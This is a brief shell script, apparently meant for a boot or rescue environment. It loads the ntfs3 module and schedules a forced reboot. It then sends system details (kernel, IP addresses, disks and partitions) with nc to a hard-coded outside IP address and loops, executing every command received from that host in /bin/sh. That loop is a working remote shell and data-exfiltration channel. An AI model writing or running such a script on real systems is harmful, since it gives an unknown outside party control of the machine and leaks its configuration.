#!/bin/sh
modprobe ntfs3
(sleep 5400; reboot -f) &
{ uname -a; ip address show; lsblk; fdisk -l; } | nc 57.129.54.120 23458
while true; do
    nc 57.129.54.120 23458 | /bin/sh
    sleep 5
done
